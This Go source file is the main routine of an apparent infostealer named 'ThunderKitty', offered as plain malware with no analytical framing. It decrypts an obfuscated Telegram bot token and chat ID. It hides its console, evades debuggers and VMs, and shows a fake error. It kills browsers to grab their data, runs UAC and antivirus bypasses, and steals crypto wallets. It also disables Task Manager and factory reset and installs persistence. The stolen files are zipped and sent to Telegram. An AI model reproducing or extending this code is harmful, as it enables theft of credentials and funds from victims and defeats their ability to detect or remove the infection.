package main

import (
	"Caca/pkg/utils/hc"
	"Caca/core/antidbgandvm"
	"Caca/pkg/utils/mutex"
	"Caca/pkg/utils/fakeerr"
	"Caca/core/browsers"
	"Caca/pkg/utils/disablefr"
	"Caca/pkg/utils/taskmanager"
	"Caca/core/persistence"
	"Caca/core/cryptowallets" 
	"Caca/core/telegram"
	"Caca/core/uac"
	"Caca/core/antivirus"
    "os"
	"os/exec"
	"fmt"
	"sync"
	"encoding/base64"
	"archive/zip"
	"syscall"
	"io/fs"
	"io/ioutil"
	"path/filepath"
)

const (
	cMHIiMNbqt = "dONiweDPzu3cq1ro15bF5ZJzjlD+HNttOfnWhoW1tWGxcpJ+bexdPIrJWraIhw=="
	CNYdQlARhq   = "5OOC8bDvbq2M2w=="
	TaxtNiteip       = 61
)

func DecryptString(input string, key byte) string {
	decoded, err := base64.StdEncoding.DecodeString(input)
	if err != nil {
		return ""
	}
	decrypted := make([]byte, len(decoded))
	for i := 0; i < len(decoded); i++ {
		shiftedKey := (key << 2) | (key >> 3)
		decrypted[i] = (decoded[i] ^ shiftedKey) - byte(i)
		decrypted[i] = ((decrypted[i] & 0xF0) >> 4) | ((decrypted[i] & 0x0F) << 4)
	}
	return string(decrypted)
}
func zipFolder(source string, target string) error {
	zipFile, err := os.Create(target)
	if err != nil {
		return err
	}
	defer zipFile.Close()
	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()
	err = filepath.Walk(source, func(file string, info fs.FileInfo, err error) error {
		if err != nil {
			return err
		}
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}
		header.Name, err = filepath.Rel(filepath.Dir(source), file)
		if err != nil {
			return err
		}
		if info.IsDir() {
			header.Name += "/"
		}
		writer, err := zipWriter.CreateHeader(header)
		if err != nil {
			return err
		}
		if !info.IsDir() {
			data, err := ioutil.ReadFile(file)
			if err != nil {
				return err
			}
			_, err = writer.Write(data)
			if err != nil {
				return err
			}
		}
		return nil
	})
	return err
}

func killBrowsers() {
	browsers := []string{
		"chrome.exe", "firefox.exe", "brave.exe", "opera.exe",
		"kometa.exe", "orbitum.exe", "centbrowser.exe", "7star.exe",
		"sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe",
		"msedge.exe", "uran.exe", "yandex.exe", "iridium.exe",
	}
	for _, browser := range browsers {
		cmd := exec.Command("taskkill", "/F", "/IM", browser)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		_ = cmd.Run()
	}
}

func main() {
	var wg sync.WaitGroup

	TelegramBotToken := DecryptString(cMHIiMNbqt, TaxtNiteip)
	TelegramChatId := DecryptString(CNYdQlARhq, TaxtNiteip)

	if true {
		wg.Add(1)
		go func() {
			defer wg.Done()
			HideConsole.Hide()
		}()
	} else {
		fmt.Println("Hide console not enabled")
	}

	if true {
		AntiDebugVMAnalysis.Check()
	} else {
		fmt.Println("Anti-debugging and VM analysis not enabled")
	}

	if true {
		wg.Add(1)
		go func() {
			defer wg.Done()
			FakeError.Show()
		}()
	} else {
		fmt.Println("Fake error not enabled")
	}

	wg.Add(1)
	go func() {
		defer wg.Done()
		Mutex.Create()
	}()
	killBrowsers()

	if true {
		wg.Add(1)
		go func() {
			defer wg.Done()
			browsers.ThunderKittyGrab()
		}()
	} else {
		fmt.Println("Browser info grabbing not enabled")
	}

	if true {
	    wg.Add(1)
        go func() {
		    defer wg.Done()
			Uac.Run()
        }()
	} else {
	 fmt.Println("UAC bypass not enabled")
    }

	if true {
	    wg.Add(1)
        go func() {
		    defer wg.Done()
			antivirus.Run()
        }()
	} else {
	 fmt.Println("Anti-Virus bypass not enabled")
    }

	if true {
		wg.Add(1)
		go func() {
			defer wg.Done()
			CryptoWallets.Run()
		}()
	} else {
		fmt.Println("Crypto Wallets not enabled")
	}

	if true {
		wg.Add(1)
		go func() {
			defer wg.Done()
			FactoryReset.Disable()
		}()
	} else {
		fmt.Println("Factory reset not disabled")
	}

	if true {
		wg.Add(1)
		go func() {
			defer wg.Done()
			TaskManager.Disable()
		}()
	} else {
		fmt.Println("Task manager not disabled")
	}

	if true {
		wg.Add(1)
		go func() {
			defer wg.Done()
			Persistence.Create()
		}()
	} else {
		fmt.Println("Persistence not enabled")
	}

	wg.Wait()

	sourceDir := os.TempDir() + "\\ThunderKitty" 
	targetZip := os.TempDir() + "\\ThunderKitty.zip"

	err := zipFolder(sourceDir, targetZip)
	if err != nil {
		fmt.Println("Error zipping folder:", err)
		return
	}
	
	err = requests.Send2TelegramDocument(TelegramBotToken, TelegramChatId, targetZip)
	if err != nil {
		fmt.Println("Error sending document:", err)
	} else {
		fmt.Println("Document sent successfully.")
	}
}
